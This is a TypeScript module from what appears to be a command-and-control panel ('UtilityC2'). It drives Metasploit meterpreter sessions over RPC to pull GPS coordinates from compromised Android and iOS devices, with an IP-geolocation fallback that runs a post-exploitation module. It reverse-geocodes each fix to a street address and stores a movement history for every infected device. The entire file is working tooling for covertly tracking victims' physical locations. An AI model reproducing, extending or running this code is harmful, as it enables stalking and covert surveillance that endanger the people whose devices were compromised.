/**
 * Geolocation engine — pulls real GPS/network coordinates from MSF sessions.
 *
 * Capture chain (in priority order):
 *   1. Android/iOS: meterpreter `geolocate` → real GPS from device
 *   2. Any session: run post/multi/gather/ip_address → external IP → ip-api.com geolocation
 *
 * Location-change detection: if new fix is > MOVE_THRESHOLD_METERS from last
 * known position, fire an immediate re-capture and update.
 */

import { getRpcToken, rpcCall } from "./msf-rpc";
import { supabase } from "./supabase";

// Haversine threshold to consider a "location change"
const MOVE_THRESHOLD_METERS = 150;

export type LocationFix = {
  lat: number;
  lng: number;
  accuracy?: number;
  altitude?: number;
  speed?: number;
  heading?: number;
  source: "gps" | "network" | "ip" | "unknown";
  address?: string;
  city?: string;
  country?: string;
  raw?: string;
};

export type StoredLocation = LocationFix & {
  id: string;
  device_id: string;
  session_id: number | null;
  captured_at: string;
};

// ── Haversine distance in meters ─────────────────────────────

export function haversineMeters(
  lat1: number, lng1: number,
  lat2: number, lng2: number,
): number {
  const R = 6371000;
  const dLat = (lat2 - lat1) * Math.PI / 180;
  const dLng = (lng2 - lng1) * Math.PI / 180;
  const a =
    Math.sin(dLat / 2) ** 2 +
    Math.cos(lat1 * Math.PI / 180) *
    Math.cos(lat2 * Math.PI / 180) *
    Math.sin(dLng / 2) ** 2;
  return R * 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1 - a));
}

// ── Parse MSF geolocate output ────────────────────────────────
// Output format:
//   [*] Current Location:
//       Latitude  : 37.7749295
//       Longitude : -122.4194155
//       Accuracy  : 0.0 meters
//   Google Maps  : https://maps.google.com/maps?q=37.7749295,-122.4194155

function parseMeterpreterGeolocate(output: string): LocationFix | null {
  const latMatch  = output.match(/Latitude\s*:\s*([-\d.]+)/i);
  const lngMatch  = output.match(/Longitude\s*:\s*([-\d.]+)/i);
  const accMatch  = output.match(/Accuracy\s*:\s*([\d.]+)/i);
  const altMatch  = output.match(/Altitude\s*:\s*([-\d.]+)/i);
  const spdMatch  = output.match(/Speed\s*:\s*([\d.]+)/i);
  const hdgMatch  = output.match(/Heading\s*:\s*([\d.]+)/i);

  if (!latMatch || !lngMatch) return null;

  const lat = parseFloat(latMatch[1]);
  const lng = parseFloat(lngMatch[1]);
  if (isNaN(lat) || isNaN(lng)) return null;
  // Sanity check
  if (Math.abs(lat) > 90 || Math.abs(lng) > 180) return null;

  return {
    lat,
    lng,
    accuracy:  accMatch  ? parseFloat(accMatch[1])  : undefined,
    altitude:  altMatch  ? parseFloat(altMatch[1])  : undefined,
    speed:     spdMatch  ? parseFloat(spdMatch[1])  : undefined,
    heading:   hdgMatch  ? parseFloat(hdgMatch[1])  : undefined,
    source:    "gps",
    raw:       output,
  };
}

// ── Write meterpreter command and collect output ──────────────

async function meterWrite(
  token: string,
  sessionId: number,
  command: string,
  waitMs = 3000,
): Promise<string> {
  await rpcCall("session.meterpreter_write", [sessionId, command + "\n"], token);
  await new Promise((r) => setTimeout(r, waitMs));
  let out = "";
  for (let i = 0; i < 4; i++) {
    const res = await rpcCall<{ data?: string; busy?: boolean }>(
      "session.meterpreter_read", [sessionId], token,
    );
    out += res.data ?? "";
    if (!res.busy && !res.data) break;
    await new Promise((r) => setTimeout(r, 500));
  }
  return out;
}

// ── GPS via meterpreter geolocate ─────────────────────────────

async function captureGPS(sessionId: number): Promise<LocationFix | null> {
  try {
    const token = await getRpcToken();
    const output = await meterWrite(token, sessionId, "geolocate", 4000);
    return parseMeterpreterGeolocate(output);
  } catch {
    return null;
  }
}

// ── IP-based geolocation fallback ─────────────────────────────

async function captureIPGeo(sessionId: number, tunnelIp?: string): Promise<LocationFix | null> {
  try {
    let ip = tunnelIp;

    if (!ip) {
      // Try to get external IP from the session
      const token = await getRpcToken();
      const out = await meterWrite(token, sessionId, "run post/multi/gather/ip_address", 3000);
      const ipMatch = out.match(/External IP\s*:\s*([\d.]+)/i) ||
                      out.match(/(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})/);
      ip = ipMatch?.[1];
    }

    if (!ip || ip.startsWith("10.") || ip.startsWith("192.168.") || ip.startsWith("127.")) {
      return null; // private IP — not useful for geolocation
    }

    const res = await fetch(`https://ip-api.com/json/${ip}?fields=status,lat,lon,city,country,regionName,isp,query`);
    if (!res.ok) return null;
    const data = await res.json() as {
      status: string; lat?: number; lon?: number;
      city?: string; country?: string; regionName?: string; isp?: string;
    };

    if (data.status !== "success" || !data.lat || !data.lon) return null;

    return {
      lat: data.lat,
      lng: data.lon,
      source: "ip",
      city:    data.city,
      country: data.country,
      address: [data.city, data.regionName, data.country].filter(Boolean).join(", "),
    };
  } catch {
    return null;
  }
}

// ── Reverse geocode a lat/lng → human address ─────────────────

export async function reverseGeocode(lat: number, lng: number): Promise<{ address?: string; city?: string; country?: string }> {
  try {
    const res = await fetch(
      `https://nominatim.openstreetmap.org/reverse?lat=${lat}&lon=${lng}&format=json`,
      { headers: { "User-Agent": "UtilityC2/1.0" } },
    );
    if (!res.ok) return {};
    const data = await res.json() as {
      display_name?: string;
      address?: { city?: string; town?: string; village?: string; country?: string };
    };
    const addr = data.address ?? {};
    return {
      address: data.display_name,
      city:    addr.city ?? addr.town ?? addr.village,
      country: addr.country,
    };
  } catch {
    return {};
  }
}

// ── Main capture function ─────────────────────────────────────

export async function captureLocation(
  sessionId: number,
  deviceId: string,
  tunnelIp?: string,
  sessionType?: string,
): Promise<LocationFix | null> {
  // Try real GPS first (works on Android/iOS meterpreter)
  let fix: LocationFix | null = null;

  if (!sessionType || sessionType.toLowerCase().includes("android") ||
      sessionType.toLowerCase().includes("ios")) {
    fix = await captureGPS(sessionId);
  }

  // Fallback: IP geolocation
  if (!fix) {
    fix = await captureIPGeo(sessionId, tunnelIp);
  }

  if (!fix) return null;

  // Reverse geocode if no address yet
  if (!fix.address) {
    const geo = await reverseGeocode(fix.lat, fix.lng);
    fix.address = geo.address;
    fix.city    = geo.city;
    fix.country = geo.country;
  }

  // Get last known location for this device
  const { data: lastLoc } = await supabase
    .from("locations")
    .select("lat, lng, captured_at")
    .eq("device_id", deviceId)
    .order("captured_at", { ascending: false })
    .limit(1)
    .single();

  // Check if device moved
  const moved = lastLoc
    ? haversineMeters(lastLoc.lat, lastLoc.lng, fix.lat, fix.lng) > MOVE_THRESHOLD_METERS
    : true;

  if (!moved && lastLoc) {
    // Not moved — update last_seen timestamp only
    const lastCaptured = new Date(lastLoc.captured_at).getTime();
    const ageMinutes = (Date.now() - lastCaptured) / 60000;
    if (ageMinutes < 25) return fix; // Skip storage if recent + not moved
  }

  // Store to Supabase
  await supabase.from("locations").insert({
    device_id:  deviceId,
    session_id: sessionId,
    lat:        fix.lat,
    lng:        fix.lng,
    accuracy:   fix.accuracy ?? null,
    altitude:   fix.altitude ?? null,
    speed:      fix.speed ?? null,
    heading:    fix.heading ?? null,
    source:     fix.source,
    address:    fix.address ?? null,
    city:       fix.city ?? null,
    country:    fix.country ?? null,
  });

  return fix;
}

// ── Batch: capture all active sessions ───────────────────────

export async function captureAllSessionLocations(): Promise<{
  sessionId: number;
  deviceId: string;
  fix: LocationFix | null;
}[]> {
  const token = await getRpcToken();
  const sessions = await rpcCall<Record<string, Record<string, string>>>(
    "session.list", [], token,
  );
  if (!sessions || Object.keys(sessions).length === 0) return [];

  const results = [];
  for (const [id, info] of Object.entries(sessions)) {
    const sessionId = Number(id);
    // Find device_id by session_id in Supabase
    const { data: device } = await supabase
      .from("devices")
      .select("id, platform")
      .eq("session_id", sessionId)
      .single();

    const deviceId = device?.id ?? `session-${sessionId}`;
    const tunnelIp = info.tunnel_peer?.split(":")?.[0];

    const fix = await captureLocation(sessionId, deviceId, tunnelIp, device?.platform ?? info.platform);
    results.push({ sessionId, deviceId, fix });

    // Rate limit
    await new Promise((r) => setTimeout(r, 500));
  }
  return results;
}

// ── Fetch location history for a device ─────────────────────

export async function getDeviceLocations(deviceId: string, limit = 100): Promise<StoredLocation[]> {
  const { data } = await supabase
    .from("locations")
    .select("*")
    .eq("device_id", deviceId)
    .order("captured_at", { ascending: false })
    .limit(limit);
  return (data ?? []) as StoredLocation[];
}

// ── Latest location per device ───────────────────────────────

export async function getLatestLocations(): Promise<StoredLocation[]> {
  // Get most recent location per device using a subquery approach
  const { data } = await supabase
    .from("locations")
    .select("*")
    .order("captured_at", { ascending: false })
    .limit(500);

  if (!data) return [];

  // Deduplicate — one entry per device_id (most recent)
  const seen = new Set<string>();
  return (data as StoredLocation[]).filter((l) => {
    if (seen.has(l.device_id)) return false;
    seen.add(l.device_id);
    return true;
  });
}
